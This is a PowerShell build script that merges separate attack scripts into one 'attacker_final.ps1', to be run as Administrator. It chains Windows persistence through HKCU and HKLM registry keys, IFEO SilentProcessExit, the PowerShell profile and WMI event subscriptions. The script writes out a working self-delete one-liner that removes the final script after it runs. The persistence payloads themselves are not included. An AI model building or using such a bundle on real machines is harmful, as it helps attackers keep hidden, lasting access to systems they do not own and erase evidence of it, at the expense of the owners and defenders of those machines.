# build.ps1 - Merges all attack scripts into attacker_final.ps1

$outputFile = "attacker_final.ps1"

Write-Host "[BUILD] Creating $outputFile..." -ForegroundColor Cyan

# Clear output file
"" | Out-File $outputFile -Force

# STEP 1: Add header and shared functions (MUST BE FIRST)
Add-Content $outputFile "# attacker_final.ps1 - Complete Attack Script`n"
Add-Content $outputFile "# Run as Administrator for full effect`n"
Add-Content $outputFile "# ============================================`n"
Get-Content "shared_functions.ps1" | Add-Content $outputFile
Add-Content $outputFile "`n"

# STEP 2: HKCU Registry Persistence
Add-Content $outputFile "# ============================================`n"
Add-Content $outputFile "# PART 1: HKCU Registry Persistence`n"
Add-Content $outputFile "# ============================================`n"
Get-Content "attack.hkcu.ps1" | Add-Content $outputFile
Add-Content $outputFile "`n"

# STEP 3: HKLM Registry Persistence
Add-Content $outputFile "# ============================================`n"
Add-Content $outputFile "# PART 2: HKLM Registry Persistence (Admin)`n"
Add-Content $outputFile "# ============================================`n"
Get-Content "attack.hklm.ps1" | Add-Content $outputFile
Add-Content $outputFile "`n"

# STEP 4: IFEO / SilentProcessExit
Add-Content $outputFile "# ============================================`n"
Add-Content $outputFile "# PART 3: IFEO SilentProcessExit Persistence`n"
Add-Content $outputFile "# ============================================`n"
Get-Content "ifeo.ps1" | Add-Content $outputFile
Add-Content $outputFile "`n"

# STEP 5: PowerShell Profile
Add-Content $outputFile "# ============================================`n"
Add-Content $outputFile "# PART 4: PowerShell Profile Persistence`n"
Add-Content $outputFile "# ============================================`n"
Get-Content "profile_attack.ps1" | Add-Content $outputFile
Add-Content $outputFile "`n"

# STEP 6: WMI Event Subscription
Add-Content $outputFile "# ============================================`n"
Add-Content $outputFile "# PART 5: WMI Event Subscription Persistence`n"
Add-Content $outputFile "# ============================================`n"
Get-Content "wmi_attack.ps1" | Add-Content $outputFile
Add-Content $outputFile "`n"

# STEP 7: Self-delete (add at the end)
Add-Content $outputFile "# ============================================`n"
Add-Content $outputFile "# FINAL: Self-delete attacker script`n"
Add-Content $outputFile "# ============================================`n"
Add-Content $outputFile '$m=$MyInvocation.MyCommand.Path;if(Test-Path $m){Start-Job -ScriptBlock{Start-Sleep 5;Remove-Item $using:m -Force -EA 0}|Out-Null}'
Add-Content $outputFile "`n"

Write-Host "[BUILD] Successfully created $outputFile" -ForegroundColor Green
Write-Host "[BUILD] Total lines: $(Get-Content $outputFile | Measure-Object -Line).Lines" -ForegroundColor Yellow
